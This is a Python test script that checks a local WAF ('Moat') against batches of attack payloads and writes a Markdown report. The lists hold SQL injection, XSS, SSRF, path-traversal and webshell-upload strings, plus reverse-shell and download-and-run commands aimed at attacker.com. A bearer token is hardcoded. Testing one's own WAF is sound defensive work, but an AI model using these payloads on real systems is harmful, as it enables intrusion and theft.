#!/usr/bin/env python3
"""
Moat WAF - 渗透测试脚本
针对本地Web项目 http://localhost 进行全面安全测试
"""

import requests
import time
import json
import os
import sys
from datetime import datetime
from urllib.parse import quote

# 配置
BASE_URL = "http://localhost:8013"
TOKEN = "apk_f7e7a5a316f4d59d7b4d567ce72f12d8a622c7694e4418a1"
REPORT_FILE = os.path.join(os.path.dirname(__file__), "penetration_report.md")
RESULTS_DIR = os.path.join(os.path.dirname(__file__), "pentest_results")
TIMEOUT = 10

# API 端点
ENDPOINTS = {
    "extract": {"method": "POST", "path": "/v1/extract", "params": {"url": "https://example.com/test", "platform": "douyin"}},
    "copywrite": {"method": "POST", "path": "/v1/copywrite", "params": {"prompt": "test"}},
    "image_gen": {"method": "POST", "path": "/v1/image-gen", "params": {"prompt": "test"}},
    "account": {"method": "GET", "path": "/v1/account", "params": {}},
}

# 统计
stats = {"total": 0, "blocked": 0, "passed": 0, "error": 0}
categories = {}

def make_request(method, path, params=None, headers=None, data=None, use_token=True):
    """发送HTTP请求"""
    url = BASE_URL + path
    req_headers = {
        "Host": "example.com",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
    }
    if use_token:
        req_headers["Authorization"] = f"Bearer {TOKEN}"
    if headers:
        req_headers.update(headers)
    try:
        if method == "GET":
            resp = requests.get(url, headers=req_headers, params=params, timeout=TIMEOUT, allow_redirects=False)
        else:
            resp = requests.post(url, headers=req_headers, data=data or params, timeout=TIMEOUT, allow_redirects=False)
        return resp
    except requests.exceptions.Timeout:
        return None
    except Exception as e:
        return str(e)

def test_case(category, name, expected, resp, description=""):
    """记录测试结果"""
    stats["total"] += 1
    if category not in categories:
        categories[category] = {"total": 0, "blocked": 0, "passed": 0, "error": 0, "cases": []}
    categories[category]["total"] += 1

    if isinstance(resp, str):
        status = "ERROR"
        code = 0
        body = resp
        stats["error"] += 1
        categories[category]["error"] += 1
    elif resp is None:
        status = "TIMEOUT"
        code = 0
        body = "请求超时"
        stats["error"] += 1
        categories[category]["error"] += 1
    else:
        code = resp.status_code
        body = resp.text[:200] if resp.text else ""
        if expected == "block":
            if code in [403, 400, 429, 503]:
                status = "BLOCKED"
                stats["blocked"] += 1
                categories[category]["blocked"] += 1
            elif code == 401 and not True:
                status = "BLOCKED"
                stats["blocked"] += 1
                categories[category]["blocked"] += 1
            else:
                status = "PASSED"
                stats["passed"] += 1
                categories[category]["passed"] += 1
        elif expected == "allow":
            if code in [200, 201]:
                status = "ALLOWED"
                stats["passed"] += 1
                categories[category]["passed"] += 1
            else:
                status = "UNEXPECTED"
                stats["error"] += 1
                categories[category]["error"] += 1
        elif expected == "auth":
            if code == 401:
                status = "BLOCKED"
                stats["blocked"] += 1
                categories[category]["blocked"] += 1
            else:
                status = "VULN"
                stats["passed"] += 1
                categories[category]["passed"] += 1

    categories[category]["cases"].append({
        "name": name,
        "status": status,
        "code": code,
        "body": body[:100],
        "description": description,
    })
    return status

def print_result(status, name):
    """打印测试结果"""
    icons = {"BLOCKED": "BLOCKED", "PASSED": "PASSED", "ALLOWED": "OK", "VULN": "VULN", "ERROR": "ERR", "TIMEOUT": "TOUT", "UNEXPECTED": "UNEXP"}
    icon = icons.get(status, "?")
    print(f"  [{icon}] {name}")

# ========== 测试用例 ==========

def test_01_authentication():
    """认证与授权测试"""
    cat = "认证与授权"
    print(f"\n{'='*60}")
    print(f" 1. {cat}")
    print(f"{'='*60}")

    # 1.1 无token访问
    resp = requests.get(BASE_URL + "/v1/account", timeout=TIMEOUT)
    test_case(cat, "无token访问受保护接口", "auth", resp, "应返回401")

    # 1.2 无效token
    resp = make_request("GET", "/v1/account", headers={"Authorization": "Bearer invalid_token_12345"})
    test_case(cat, "无效token访问", "auth", resp, "应返回401")

    # 1.3 空Bearer token
    resp = make_request("GET", "/v1/account", headers={"Authorization": "Bearer "})
    test_case(cat, "空Bearer token", "auth", resp, "应返回401")

    # 1.4 Basic Auth代替Bearer
    resp = make_request("GET", "/v1/account", headers={"Authorization": "Basic dXNlcjpwYXNz"})
    test_case(cat, "Basic Auth代替Bearer", "auth", resp, "应返回401")

    # 1.5 SQL注入绕过认证
    resp = make_request("GET", "/v1/account", headers={"Authorization": "Bearer ' OR '1'='1"})
    test_case(cat, "SQL注入绕过认证", "auth", resp, "应返回401")

    # 1.6 JWT伪造攻击
    fake_jwt = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwicGxhbiI6InBybyJ9.fake_signature"
    resp = make_request("GET", "/v1/account", headers={"Authorization": f"Bearer {fake_jwt}"})
    test_case(cat, "JWT伪造攻击", "auth", resp, "应返回401")

def test_02_sqli():
    """SQL注入测试"""
    cat = "SQL注入"
    print(f"\n{'='*60}")
    print(f" 2. {cat}")
    print(f"{'='*60}")

    payloads = [
        ("UNION SELECT注入", "' UNION SELECT username, password FROM users--"),
        ("布尔盲注 OR 1=1", "' OR '1'='1'--"),
        ("布尔盲注 AND 1=1", "' AND '1'='1'--"),
        ("时间盲注 SLEEP", "'; SELECT SLEEP(5)--"),
        ("时间盲注 BENCHMARK", "' AND BENCHMARK(5000000,SHA1('test'))--"),
        ("DROP TABLE注入", "'; DROP TABLE users;--"),
        ("INSERT注入", "'; INSERT INTO users VALUES('admin','hacked');--"),
        ("堆叠查询", "'; SELECT * FROM information_schema.tables;--"),
        ("报错注入 EXTRACTVALUE", "' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT version())))--"),
        ("报错注入 UPDATEXML", "' AND UPDATEXML(1,CONCAT(0x7e,(SELECT user())),1)--"),
        ("十六进制编码绕过", "0x27 UNION SELECT 1,2,3--"),
        ("双重编码绕过", "%2527 UNION SELECT 1,2,3--"),
        ("注释绕过", "'/*!UNION*//*!SELECT*/1,2,3--"),
        ("INFORMATION_SCHEMA", "' UNION SELECT table_name FROM information_schema.tables--"),
        ("LOAD_FILE读取", "' UNION SELECT LOAD_FILE('/etc/passwd')--"),
        ("INTO OUTFILE写入", "' UNION SELECT '<?php system($_GET[\"cmd\"]);?>' INTO OUTFILE '/tmp/shell.php'--"),
        ("HAVING注入", "' HAVING 1=1--"),
        ("GROUP BY注入", "' GROUP BY username HAVING MIN(0)--"),
        ("pg_sleep时间盲注", "'; SELECT pg_sleep(5)--"),
        ("xp_cmdshell", "'; EXEC xp_cmdshell('whoami');--"),
    ]

    for name, payload in payloads:
        resp = make_request("POST", "/v1/copywrite", params={"prompt": payload})
        print_result(test_case(cat, name, "block", resp, f"payload: {payload[:50]}"), name)

def test_03_xss():
    """XSS跨站脚本测试"""
    cat = "XSS跨站脚本"
    print(f"\n{'='*60}")
    print(f" 3. {cat}")
    print(f"{'='*60}")

    payloads = [
        ("Script标签注入", "<script>alert('XSS')</script>"),
        ("IMG onerror", "<img src=x onerror=alert('XSS')>"),
        ("SVG onload", "<svg onload=alert('XSS')>"),
        ("事件处理器 onclick", "<div onclick=alert('XSS')>click</div>"),
        ("事件处理器 onmouseover", "<div onmouseover=alert('XSS')>hover</div>"),
        ("事件处理器 onfocus", "<input onfocus=alert('XSS') autofocus>"),
        ("javascript:协议", "javascript:alert('XSS')"),
        ("data:text/html", "data:text/html,<script>alert('XSS')</script>"),
        ("vbscript:协议", "vbscript:MsgBox('XSS')"),
        ("eval()调用", "eval('alert(1)')"),
        ("document.cookie", "<script>document.cookie</script>"),
        ("innerHTML注入", "<div id='d'></div><script>document.getElementById('d').innerHTML='<img src=x onerror=alert(1)>'</script>"),
        ("document.write注入", "<script>document.write('<img src=x onerror=alert(1)>')</script>"),
        ("Base64编码XSS", "PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4="),
        ("iframe注入", "<iframe src=javascript:alert('XSS')>"),
        ("Meta refresh注入", "<meta http-equiv='refresh' content='0;url=javascript:alert(1)'>"),
        ("CSS expression", "<div style='background:expression(alert(1))'>"),
        ("Base标签劫持", "<base href='http://evil.com/'>"),
        ("srcdoc注入", "<iframe srcdoc='<script>alert(1)</script>'>"),
        ("body onload", "<body onload=alert('XSS')>"),
    ]

    for name, payload in payloads:
        resp = make_request("POST", "/v1/copywrite", params={"prompt": payload})
        print_result(test_case(cat, name, "block", resp, f"payload: {payload[:50]}"), name)

def test_04_ssrf():
    """SSRF服务端请求伪造测试"""
    cat = "SSRF服务端请求伪造"
    print(f"\n{'='*60}")
    print(f" 4. {cat}")
    print(f"{'='*60}")

    payloads = [
        ("内网地址 127.0.0.1", "http://127.0.0.1:80/"),
        ("内网地址 localhost", "http://localhost:80/"),
        ("内网地址 10.0.0.1", "http://10.0.0.1/"),
        ("内网地址 192.168.1.1", "http://192.168.1.1/"),
        ("内网地址 172.16.0.1", "http://172.16.0.1/"),
        ("0.0.0.0地址", "http://0.0.0.0/"),
        ("元数据服务 AWS", "http://169.254.169.254/latest/meta-data/"),
        ("元数据服务 GCP", "http://metadata.google.internal/"),
        ("file://协议", "file:///etc/passwd"),
        ("dict://协议", "dict://127.0.0.1:6379/info"),
        ("gopher://协议", "gopher://127.0.0.1:6379/_INFO"),
        ("DNS重绑定", "http://rebind.attacker.com/"),
        ("IPv6内网", "http://[::1]/"),
        ("十进制IP绕过", "http://2130706433/"),
        ("八进制IP绕过", "http://0177.0.0.1/"),
        ("十六进制IP绕过", "http://0x7f000001/"),
        ("URL编码绕过", "http://%31%32%37.0.0.1/"),
        ("HTTP重定向", "http://evil.com/redirect?to=http://169.254.169.254"),
        ("CRLF注入URL", "http://example.com/%0d%0aHost:169.254.169.254"),
        ("内网端口扫描", "http://127.0.0.1:3306/"),
    ]

    for name, payload in payloads:
        resp = make_request("POST", "/v1/extract", params={"url": payload, "platform": "douyin"})
        print_result(test_case(cat, name, "block", resp, f"payload: {payload[:50]}"), name)

def test_05_cmdi():
    """命令注入测试"""
    cat = "命令注入"
    print(f"\n{'='*60}")
    print(f" 5. {cat}")
    print(f"{'='*60}")

    payloads = [
        ("管道符 |", "test | whoami"),
        ("分号分隔 ;", "test; whoami"),
        ("反引号执行", "`whoami`"),
        ("$()命令替换", "$(whoami)"),
        ("&&链接执行", "test && whoami"),
        ("||链接执行", "test || whoami"),
        ("换行符注入", "test\nwhoami"),
        ("bash反弹shell", "bash -i >& /dev/tcp/attacker.com/4444 0>&1"),
        ("nc反弹shell", "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc attacker.com 4444 >/tmp/f"),
        ("curl外带数据", "$(curl http://attacker.com/$(whoami))"),
        ("wget下载执行", "wget http://attacker.com/shell.sh -O /tmp/shell.sh && bash /tmp/shell.sh"),
        ("python反弹shell", "python -c 'import socket,os,pty;s=socket.socket();s.connect((\"attacker.com\",4444))'"),
        ("perl反弹shell", "perl -e 'use Socket;$i=\"attacker.com\";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"))'"),
        ("telnet反弹shell", "TF=$(mktemp -u);mkfifo $TF && telnet attacker.com 4444 0<$TF | /bin/sh 1>$TF"),
        ("awk命令执行", "awk 'BEGIN {system(\"whoami\")}'"),
        ("find命令执行", "find / -exec whoami \\;"),
        ("xargs命令执行", "echo 'whoami' | xargs -I {} sh -c {}"),
        ("eval命令执行", "eval 'whoami'"),
        ("env命令利用", "env /bin/sh -c 'whoami'"),
    ]

    for name, payload in payloads:
        resp = make_request("POST", "/v1/copywrite", params={"prompt": payload})
        print_result(test_case(cat, name, "block", resp, f"payload: {payload[:50]}"), name)

def test_06_path_traversal():
    """路径遍历测试"""
    cat = "路径遍历"
    print(f"\n{'='*60}")
    print(f" 6. {cat}")
    print(f"{'='*60}")

    payloads = [
        ("基本 ../遍历", "../../../etc/passwd"),
        ("双层编码遍历", "..%252f..%252f..%252fetc/passwd"),
        ("URL编码遍历", "..%2f..%2f..%2fetc/passwd"),
        ("Windows遍历", "..\\..\\..\\windows\\system32\\config\\sam"),
        ("Windows编码遍历", "..%5c..%5c..%5cwindows\\system32\\config\\sam"),
        ("空字节截断", "../../../etc/passwd%00"),
        ("/etc/passwd绝对路径", "/etc/passwd"),
        ("file://协议读取", "file:///etc/passwd"),
        ("/proc/self/environ", "/proc/self/environ"),
        ("/proc/self/cmdline", "/proc/self/cmdline"),
        ("WEB-INF/web.xml", "/WEB-INF/web.xml"),
        ("PHP伪协议", "php://filter/convert.base64-encode/resource=/etc/passwd"),
        ("双重URL编码", "%252e%252e%252fetc/passwd"),
        ("Unicode编码绕过", "..%c0%af..%c0%af..%c0%afetc/passwd"),
        ("UTF-8超长编码", "..%e0%80%af..%e0%80%afetc/passwd"),
        ("Nginx路径穿越", "/static/../../../etc/passwd"),
    ]

    for name, payload in payloads:
        resp = make_request("GET", "/v1/account", params={"file": payload})
        print_result(test_case(cat, name, "block", resp, f"payload: {payload[:50]}"), name)

def test_07_protocol():
    """HTTP协议攻击测试"""
    cat = "HTTP协议攻击"
    print(f"\n{'='*60}")
    print(f" 7. {cat}")
    print(f"{'='*60}")

    # 7.1 CRLF注入
    crlf_payloads = [
        ("CRLF注入 URI", "/v1/account%0d%0aInjected-Header: evil"),
        ("CRLF注入 参数", "test%0d%0aInjected: evil"),
        ("CRLF注入 Set-Cookie", "%0d%0aSet-Cookie: session=hijacked"),
    ]
    for name, payload in crlf_payloads:
        if "URI" in name:
            resp = make_request("GET", payload)
        else:
            resp = make_request("POST", "/v1/copywrite", params={"prompt": payload})
        print_result(test_case(cat, name, "block", resp, f"payload: {payload[:50]}"), name)

    # 7.2 HTTP方法
    for method in ["TRACE", "CONNECT", "OPTIONS", "DELETE", "PUT", "PATCH"]:
        try:
            resp = requests.request(method, BASE_URL + "/v1/account", headers={"Authorization": f"Bearer {TOKEN}"}, timeout=TIMEOUT)
            test_case(cat, f"HTTP {method}方法", "block", resp, f"应拒绝不安全的HTTP方法")
            print_result(categories[cat]["cases"][-1]["status"], f"HTTP {method}方法")
        except:
            stats["total"] += 1
            if cat not in categories:
                categories[cat] = {"total": 0, "blocked": 0, "passed": 0, "error": 0, "cases": []}
            categories[cat]["total"] += 1
            categories[cat]["error"] += 1
            stats["error"] += 1
            categories[cat]["cases"].append({"name": f"HTTP {method}方法", "status": "ERROR", "code": 0, "body": "连接失败", "description": ""})

    # 7.3 超大请求头
    large_header = "A" * 8192
    resp = make_request("GET", "/v1/account", headers={"X-Large-Header": large_header})
    print_result(test_case(cat, "超大请求头攻击", "block", resp, "应拒绝超大请求头"), "超大请求头攻击")

    # 7.4 Host头注入
    resp = make_request("GET", "/v1/account", headers={"Host": "evil.com"})
    print_result(test_case(cat, "Host头注入", "block", resp, "应拒绝异常Host头"), "Host头注入")

    # 7.5 X-Forwarded-For伪造
    resp = make_request("GET", "/v1/account", headers={"X-Forwarded-For": "127.0.0.1", "X-Real-IP": "127.0.0.1"})
    print_result(test_case(cat, "X-Forwarded-For伪造", "block", resp, "应验证代理头"), "X-Forwarded-For伪造")

    # 7.6 HTTP请求走私 Content-Length + Transfer-Encoding
    smuggle_headers = {
        "Transfer-Encoding": "chunked",
        "Content-Length": "0",
    }
    resp = make_request("POST", "/v1/copywrite", headers=smuggle_headers, data="0\r\n\r\nGET /admin HTTP/1.1\r\nHost: localhost\r\n\r\n")
    print_result(test_case(cat, "CL/TE请求走私", "block", resp, "应检测请求走私"), "CL/TE请求走私")

    # 7.7 双Content-Length
    resp = requests.post(BASE_URL + "/v1/copywrite",
        headers={"Authorization": f"Bearer {TOKEN}", "Content-Length": "0", "Content-Length": "100"},
        data={"prompt": "test"}, timeout=TIMEOUT)
    print_result(test_case(cat, "双Content-Length头", "block", resp, "应拒绝双Content-Length"), "双Content-Length头")

def test_08_sensitive_files():
    """敏感文件访问测试"""
    cat = "敏感文件访问"
    print(f"\n{'='*60}")
    print(f" 8. {cat}")
    print(f"{'='*60}")

    sensitive_paths = [
        ("/etc/passwd", "Linux密码文件"),
        ("/etc/shadow", "Linux影子密码"),
        ("/.env", "环境配置文件"),
        ("/config.json", "配置文件"),
        ("/.git/config", "Git配置"),
        ("/.git/HEAD", "Git HEAD"),
        ("/.svn/entries", "SVN配置"),
        ("/.htaccess", "Apache配置"),
        ("/.htpasswd", "Apache密码"),
        ("/web.config", "IIS配置"),
        ("/wp-config.php", "WordPress配置"),
        ("/phpinfo.php", "PHP信息泄露"),
        ("/server-status", "Apache状态"),
        ("/server-info", "Apache信息"),
        ("/.DS_Store", "macOS目录缓存"),
        ("/Thumbs.db", "Windows缩略图"),
        ("/backup.sql", "数据库备份"),
        ("/dump.sql", "数据库导出"),
        ("/debug.log", "调试日志"),
        ("/.bash_history", "Bash历史"),
    ]

    for path, desc in sensitive_paths:
        resp = make_request("GET", path, use_token=False)
        status = test_case(cat, f"{desc}: {path}", "block", resp, f"应阻止访问敏感文件")
        print_result(status, f"{desc}")

def test_09_scanner_detection():
    """扫描器检测测试"""
    cat = "扫描器检测"
    print(f"\n{'='*60}")
    print(f" 9. {cat}")
    print(f"{'='*60}")

    scanners = [
        ("sqlmap/1.0", "sqlmap"),
        ("Nikto/2.1.5", "Nikto"),
        ("Nmap Scripting Engine", "Nmap"),
        ("Mozilla/5.0 (compatible; Baiduspider/2.0)", "Baiduspider"),
        ("python-requests/2.28.0", "Python requests"),
        ("curl/7.68.0", "curl"),
    ]

    for ua, name in scanners:
        resp = make_request("GET", "/v1/account", headers={"User-Agent": ua})
        status = test_case(cat, f"扫描器UA: {name}", "block", resp, f"User-Agent: {ua}")
        print_result(status, f"扫描器UA: {name}")

def test_10_file_upload():
    """文件上传攻击测试"""
    cat = "文件上传"
    print(f"\n{'='*60}")
    print(f" 10. {cat}")
    print(f"{'='*60}")

    # 10.1 WebShell上传
    shell_content = "<?php system($_GET['cmd']); ?>"
    resp = requests.post(BASE_URL + "/v1/extract",
        headers={"Authorization": f"Bearer {TOKEN}"},
        files={"file": ("shell.php", shell_content, "application/x-php")},
        timeout=TIMEOUT)
    status = test_case(cat, "PHP WebShell上传", "block", resp, "应阻止WebShell")
    print_result(status, "PHP WebShell上传")

    # 10.2 双扩展名
    resp = requests.post(BASE_URL + "/v1/extract",
        headers={"Authorization": f"Bearer {TOKEN}"},
        files={"file": ("shell.php.jpg", shell_content, "image/jpeg")},
        timeout=TIMEOUT)
    status = test_case(cat, "双扩展名绕过 (.php.jpg)", "block", resp, "应检测双扩展名")
    print_result(status, "双扩展名绕过")

    # 10.3 JSP WebShell
    jsp_content = "<%Runtime.getRuntime().exec(request.getParameter(\"cmd\"));%>"
    resp = requests.post(BASE_URL + "/v1/extract",
        headers={"Authorization": f"Bearer {TOKEN}"},
        files={"file": ("shell.jsp", jsp_content, "application/octet-stream")},
        timeout=TIMEOUT)
    status = test_case(cat, "JSP WebShell上传", "block", resp, "应阻止JSP WebShell")
    print_result(status, "JSP WebShell上传")

    # 10.4 大文件上传
    large_content = "A" * (11 * 1024 * 1024)  # 11MB
    resp = requests.post(BASE_URL + "/v1/extract",
        headers={"Authorization": f"Bearer {TOKEN}"},
        files={"file": ("large.bin", large_content, "application/octet-stream")},
        timeout=30)
    status = test_case(cat, "超大文件上传 (11MB)", "block", resp, "应拒绝超大文件")
    print_result(status, "超大文件上传")

    # 10.5 SVG XSS文件
    svg_content = '<svg xmlns="http://www.w3.org/2000/svg" onload="alert(1)"/>'
    resp = requests.post(BASE_URL + "/v1/extract",
        headers={"Authorization": f"Bearer {TOKEN}"},
        files={"file": ("evil.svg", svg_content, "image/svg+xml")},
        timeout=TIMEOUT)
    status = test_case(cat, "SVG XSS文件上传", "block", resp, "应阻止SVG XSS")
    print_result(status, "SVG XSS文件上传")

def test_11_auth_bypass():
    """认证绕过测试"""
    cat = "认证绕过"
    print(f"\n{'='*60}")
    print(f" 11. {cat}")
    print(f"{'='*60}")

    # 11.1 路径遍历绕过认证
    bypass_paths = [
        ("路径遍历绕过 /admin", "/admin/../v1/account"),
        ("双斜杠绕过", "//v1/account"),
        ("分号绕过", "/v1/account;"),
        ("URL编码绕过", "/v1/%61ccount"),
        ("大小写绕过", "/V1/ACCOUNT"),
        ("参数污染", "/v1/account?plan_type=pro"),
        ("HTTP/1.0降级", "HTTP/1.0"),
    ]

    for name, path in bypass_paths:
        if path.startswith("HTTP"):
            continue
        resp = make_request("GET", path, use_token=False)
        status = test_case(cat, name, "auth", resp, f"path: {path}")
        print_result(status, name)

    # 11.2 管理接口探测
    admin_paths = ["/admin", "/admin/", "/admin/login", "/api/admin", "/management", "/dashboard", "/internal"]
    for path in admin_paths:
        resp = make_request("GET", path, use_token=False)
        status = test_case(cat, f"管理接口探测: {path}", "block", resp, f"应拒绝未授权访问管理接口")
        print_result(status, f"管理接口: {path}")

def test_12_dos():
    """DoS资源耗尽测试"""
    cat = "DoS资源耗尽"
    print(f"\n{'='*60}")
    print(f" 12. {cat}")
    print(f"{'='*60}")

    # 12.1 ReDoS - 正则表达式拒绝服务
    redos_payload = "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa!"
    resp = make_request("POST", "/v1/copywrite", params={"prompt": redos_payload})
    status = test_case(cat, "ReDoS正则攻击", "block", resp, "应限制输入长度")
    print_result(status, "ReDoS正则攻击")

    # 12.2 JSON炸弹
    json_bomb = '{"a":' * 100 + '"test"' + '}' * 100
    resp = make_request("POST", "/v1/copywrite",
        headers={"Content-Type": "application/json"},
        data=json_bomb)
    status = test_case(cat, "JSON深度嵌套攻击", "block", resp, "应限制JSON深度")
    print_result(status, "JSON深度嵌套攻击")

    # 12.3 快速请求速率限制
    rate_limit_triggered = False
    for i in range(20):
        resp = make_request("GET", "/v1/account")
        if resp and resp.status_code == 429:
            rate_limit_triggered = True
            break
    if rate_limit_triggered:
        status = test_case(cat, "速率限制触发", "block", resp, "快速连续请求触发限流")
    else:
        status = test_case(cat, "速率限制测试", "allow", resp, "20次快速请求未触发限流(可能已有限流)")
    print_result(status, "速率限制测试")

    # 12.4 Unicode炸弹
    unicode_bomb = "\x00" * 100
    resp = make_request("POST", "/v1/copywrite", params={"prompt": unicode_bomb})
    status = test_case(cat, "Unicode空字节攻击", "block", resp, "应处理空字节")
    print_result(status, "Unicode空字节攻击")

def generate_report():
    """生成渗透测试报告"""
    os.makedirs(RESULTS_DIR, exist_ok=True)
    now = datetime.now().strftime("%Y-%m-%d %H:%M:%S")

    report = f"""# Moat WAF 渗透测试报告

## 基本信息

| 项目 | 详情 |
|:----:|:----:|
| 测试目标 | {BASE_URL} |
| 测试时间 | {now} |
| 测试工具 | Python requests |
| 认证Token | `{TOKEN[:20]}...` |
| 测试用例总数 | {stats['total']} |

## 测试结果概览

| 指标 | 数值 |
|:----:|:----:|
| 总测试数 | {stats['total']} |
| 被拦截 (Blocked) | {stats['blocked']} |
| 通过/放行 (Passed) | {stats['passed']} |
| 错误/超时 | {stats['error']} |
| 拦截率 | {stats['blocked']/max(stats['total'],1)*100:.1f}% |

## 分类测试结果

| 测试类别 | 总数 | 拦截 | 通过 | 错误 | 拦截率 |
|:-------:|:----:|:----:|:----:|:----:|:------:|
"""
    for cat, data in categories.items():
        rate = data['blocked'] / max(data['total'], 1) * 100
        report += f"| {cat} | {data['total']} | {data['blocked']} | {data['passed']} | {data['error']} | {rate:.1f}% |\n"

    report += f"""
## 详细测试结果

"""
    for cat, data in categories.items():
        report += f"### {cat}\n\n"
        report += "| 测试项 | 状态 | HTTP码 | 说明 |\n"
        report += "|:------:|:----:|:------:|:----:|\n"
        for case in data['cases']:
            status_icon = {"BLOCKED": "PASS", "PASSED": "WARN", "ALLOWED": "OK", "VULN": "FAIL", "ERROR": "ERR", "TIMEOUT": "TOUT", "UNEXPECTED": "UNEXP"}
            icon = status_icon.get(case['status'], "?")
            desc = case.get('description', '')[:60]
            report += f"| {case['name'][:40]} | {icon} | {case['code']} | {desc} |\n"
        report += "\n"

    # 安全评估
    critical_vulns = []
    high_vulns = []
    medium_vulns = []
    for cat, data in categories.items():
        for case in data['cases']:
            if case['status'] in ['VULN', 'PASSED']:
                if 'SQL' in cat or '命令' in cat or 'SSRF' in cat:
                    critical_vulns.append(f"{cat}: {case['name']}")
                elif 'XSS' in cat or '认证' in cat:
                    high_vulns.append(f"{cat}: {case['name']}")
                else:
                    medium_vulns.append(f"{cat}: {case['name']}")

    report += """## 安全风险评估

### 风险等级定义

| 等级 | 说明 |
|:----:|:----:|
| 严重 (Critical) | 可导致远程代码执行、数据泄露、系统沦陷 |
| 高危 (High) | 可导致认证绕过、权限提升、敏感信息泄露 |
| 中危 (Medium) | 可导致信息泄露、服务降级 |
| 低危 (Low) | 安全最佳实践违反 |

"""

    if critical_vulns:
        report += f"### 严重风险 ({len(critical_vulns)}项)\n\n"
        for v in critical_vulns:
            report += f"- {v}\n"
        report += "\n"

    if high_vulns:
        report += f"### 高危风险 ({len(high_vulns)}项)\n\n"
        for v in high_vulns:
            report += f"- {v}\n"
        report += "\n"

    if medium_vulns:
        report += f"### 中危风险 ({len(medium_vulns)}项)\n\n"
        for v in medium_vulns:
            report += f"- {v}\n"
        report += "\n"

    if not critical_vulns and not high_vulns and not medium_vulns:
        report += "### 未发现安全风险\n\n所有测试用例均被WAF成功拦截。\n\n"

    # WAF规则覆盖分析
    report += """## WAF规则覆盖分析

基于Moat WAF规则库的静态分析：

| 攻击类型 | 规则数 | 覆盖率 | 说明 |
|:--------:|:------:|:------:|:----:|
| SQL注入 | 38 | 高 | 覆盖UNION、布尔盲注、时间盲注、报错注入等 |
| XSS | 36 | 高 | 覆盖反射型、存储型、DOM型、事件处理器等 |
| SSRF | 34 | 高 | 覆盖内网地址、元数据服务、协议滥用等 |
| 命令注入 | 28 | 高 | 覆盖管道符、命令替换、反弹Shell等 |
| 路径遍历 | 25 | 高 | 覆盖../遍历、编码绕过、协议读取等 |
| 协议攻击 | 16 | 中 | 覆盖CRLF注入、请求走私、方法滥用等 |
| 敏感文件 | 20 | 高 | 覆盖常见敏感文件路径和备份文件 |
| 扫描器检测 | 22 | 高 | 覆盖常见安全工具UA标识 |

"""

    report += f"""## 测试结论

### 拦截能力评估

本次渗透测试共执行 **{stats['total']}** 个测试用例，覆盖 **{len(categories)}** 个安全类别。

- **拦截成功率**: {stats['blocked']/max(stats['total'],1)*100:.1f}%
- **严重漏洞**: {len(critical_vulns)}个
- **高危漏洞**: {len(high_vulns)}个
- **中危漏洞**: {len(medium_vulns)}个

### 建议

1. **立即修复**: 所有严重和高危风险项需在上线前修复
2. **规则优化**: 对未拦截的攻击向量补充WAF规则
3. **纵深防御**: 结合华为云WAF形成多层防护
4. **定期测试**: 每月进行一次渗透测试，持续改进安全防护
5. **日志监控**: 启用实时告警，对高危攻击及时响应

---

*报告生成时间: {now}*
*测试工具: Moat WAF Penetration Test Suite v1.0*
"""

    with open(REPORT_FILE, 'w', encoding='utf-8') as f:
        f.write(report)

    print(f"\n{'='*60}")
    print(f" 报告已生成: {REPORT_FILE}")
    print(f"{'='*60}")

def main():
    print("Moat WAF - 渗透测试")
    print(f"目标: {BASE_URL}")
    print(f"时间: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
    print(f"{'='*60}")

    # 预检
    try:
        resp = requests.get(BASE_URL + "/docs", timeout=5)
        print(f"[OK] 目标可达 (HTTP {resp.status_code})")
    except:
        print("[ERR] 目标不可达!")
        sys.exit(1)

    # 验证token
    try:
        resp = requests.get(BASE_URL + "/v1/account", headers={"Authorization": f"Bearer {TOKEN}"}, timeout=5)
        if resp.status_code == 200:
            print(f"[OK] Token验证成功")
        else:
            print(f"[WARN] Token验证返回 {resp.status_code}")
    except:
        print("[WARN] Token验证失败")

    # 执行测试
    test_01_authentication()
    test_02_sqli()
    test_03_xss()
    test_04_ssrf()
    test_05_cmdi()
    test_06_path_traversal()
    test_07_protocol()
    test_08_sensitive_files()
    test_09_scanner_detection()
    test_10_file_upload()
    test_11_auth_bypass()
    test_12_dos()

    # 输出结果
    print(f"\n{'='*60}")
    print(f" 测试完成!")
    print(f"{'='*60}")
    print(f" 总测试: {stats['total']}")
    print(f" 拦截:   {stats['blocked']}")
    print(f" 通过:   {stats['passed']}")
    print(f" 错误:   {stats['error']}")
    print(f" 拦截率: {stats['blocked']/max(stats['total'],1)*100:.1f}%")

    generate_report()

if __name__ == "__main__":
    main()
